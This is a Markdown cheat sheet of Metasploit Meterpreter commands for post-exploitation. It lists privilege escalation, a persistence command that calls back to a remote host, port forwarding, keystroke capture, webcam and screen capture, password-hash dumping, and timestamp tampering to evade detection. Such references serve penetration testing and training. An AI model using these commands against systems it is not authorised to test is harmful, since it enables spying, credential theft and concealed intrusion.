# Metasploit Meterpreter

## Basic Commands

- **help**: Show available meterpreter commands
- **sysinfo**: Display system information (OS, hostname, architecture)
- **ps**: List running processes (PID, name, user)
- **kill** : Terminate a process by PID
- **migrate** : Move meterpreter to another process (often a more stable one)
- **rev2self**: Revert the current process to its original user context

## File System Commands

- **ls**: List files in the current directory
- **cd** : Change the current directory to `<path>`
- **pwd**: Show the current directory path
- **cat** : Display the contents of `<file>`
- **download** : Download `<file>` from the target
- **upload** : Upload `<file>` from local to the target

## Network Commands

- **ipconfig**: Show network adapter configuration
- **route**: View or modify the routing table
- **netstat**: View active network connections
- **portfwd**: Forward a local port to a remote service (`portfwd add -l <localport> -p <remoteport> -r <targetIP>`)
- **getsockname**: Display the socket name for the active connection

## User Management Commands

- **getuid**: Show the current user ID
- **ps**: List running processes with user ownership
- **getprivs**: List the current user’s privileges
- **getsystem**: Attempt privilege escalation to SYSTEM

## Persistence Commands

- **persistence**: Enable persistent meterpreter access on the target
- **run** : Execute a script (e.g., `run persistence -U -i <interval> -p <port> -r <host>`)

## Shell Commands

- **shell**: Open a command shell on the target
- **execute -f** : Run a command on the target
- **background**: Background the current meterpreter session
- **Ctrl+Z**: Suspend/Background the current session in console mode

## Other Commands

- **use** : Load a meterpreter extension
- **run** : Execute a script or extension command
- **keyscan_start**: Start capturing keystrokes on the target
- **keyscan_dump**: Display captured keystrokes
- **screenshot**: Take a screenshot of the target’s desktop
- **webcam_list**: List available webcams on the target
- **webcam_snap**: Capture a snapshot from a webcam
- **hashdump**: Dump local password hashes on the target
- **timestomp**: Alter file timestamps on the target to evade detection
